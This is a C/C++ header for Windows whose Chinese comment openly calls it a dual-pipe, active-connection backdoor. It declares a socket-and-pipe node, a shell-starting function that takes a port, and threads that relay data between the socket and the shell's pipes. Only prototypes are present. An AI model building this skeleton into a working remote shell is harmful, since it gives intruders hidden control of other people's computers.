#pragma once
#include "stdafx.h"
#include <Windows.h>

// Windows Socket Files:
#include <winsock.h>
#pragma comment(lib, "ws2_32.lib")
/**

这是一个双管道主动连接型后门

*/
//定义数据类型为通信节点，包括socket和管道
typedef struct _COMNODE
{
	SOCKET socket;
	HANDLE pipe;


}ComNode,*pComNode;
//用于初始化socket
BOOL SockInit();


/**
//用于启动shell
port:本地监听的端口

*/

BOOL StartShell(UINT port);

/**
线程函数
用于处理向管道方向的输入
socket->pipe
*/
DWORD WINAPI ThreadInput(LPVOID lppara);

/**
线程函数
用于处理来自管道的输出
pipe->socket
*/
DWORD WINAPI ThreadOutput(LPVOID lppara);
